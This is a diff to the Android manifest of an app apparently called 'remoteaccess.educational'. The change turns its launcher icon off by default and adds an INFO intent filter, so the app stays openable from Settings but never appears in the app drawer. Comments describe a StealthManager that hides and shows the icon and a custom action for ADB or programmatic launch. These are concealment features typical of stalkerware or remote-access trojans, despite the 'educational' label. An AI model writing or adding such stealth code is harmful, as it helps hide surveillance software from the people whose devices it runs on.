@@ -76,15 +76,22 @@
         tools:targetApi="34">
 
         <!--
-            Main Activity — NOT visible in app drawer (no LAUNCHER intent filter).
-            Can still be opened via Settings > App Info > Open.
-            Also handles the custom LAUNCH action for programmatic starts.
+            Main Activity — NOT visible in the home launcher.
+            CATEGORY_INFO makes getLaunchIntentForPackage() resolve this activity,
+            which is exactly what Settings > App Info > Open uses — so "Open"
+            stays enabled while the app never appears in the app drawer.
+            CATEGORY_LAUNCHER is intentionally absent from this activity.
         -->
         <activity
             android:name=".MainActivity"
             android:enabled="true"
             android:exported="true"
             android:launchMode="singleTop">
+            <!-- Enables Settings > App Info > Open without showing a launcher icon -->
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.INFO" />
+            </intent-filter>
             <!-- Custom action for programmatic / ADB launch -->
             <intent-filter>
                 <action android:name="com.remoteaccess.educational.LAUNCH" />
@@ -93,15 +100,14 @@
         </activity>
 
         <!--
-            Launcher alias — disabled by default so the app never appears in
-            the app drawer. StealthManager.hideAppIcon() targets this component.
-            Re-enable it (COMPONENT_ENABLED_STATE_ENABLED) to show the icon,
-            or leave/set disabled to keep it hidden.
+            Launcher alias — disabled by default so no icon appears in the drawer.
+            StealthManager.showAppIcon() can enable this to temporarily surface
+            the app in the launcher; hideAppIcon() disables it again.
         -->
         <activity-alias
             android:name=".LauncherAlias"
             android:targetActivity=".MainActivity"
-            android:enabled="true"
+            android:enabled="false"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
